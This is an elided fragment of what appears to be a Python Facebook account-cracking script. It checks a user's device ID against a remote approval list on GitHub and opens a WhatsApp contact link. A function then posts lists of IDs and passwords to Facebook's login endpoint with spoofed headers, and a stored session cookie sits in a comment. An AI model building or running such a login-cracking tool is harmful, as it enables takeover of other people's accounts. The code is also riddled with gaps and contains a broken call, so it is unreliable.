...
def uaku():
	try:
		...
		a=requests.get('https://github.com/EROOR9/Approval.txt/blob/main/Approval.txt').text
		ua=open('.mix.txt','w')
...
def FOFALWAYSONFIRE():
  ...
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/EROOR9/Approval.txt/blob/main/Approval.txt').text
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801568579466?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def ckx():
	...
	server = requests.get(f'https://github.com/EROOR9/Approval.txt/blob/main/Approval.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/EROOR9/Approval.txt/blob/main/Approval.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
...
def m1(ids,names,passlist):
    ...
    # 'cookie': 'datr=KY-_ZCLlW-jSk_XL5h1f2-zK; sb=KY-_ZHrfXMgjN2o3L438ObrF; m_pixel_ratio=1.4375; wd=891x1721; dpr=1.58045494556427; fr=0ttAOmzibRU7eaEfp..Bkv48p.o3.AAA.0.0.BkwJwB.AWV_GR0iR_8',
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                        ...
                        complete = session.post(f'https://web.facebook.com/?_rdc=1&_rdr', cookies=cookies, headers=headers',data=idpass,allow_redirects=False,headers=head)
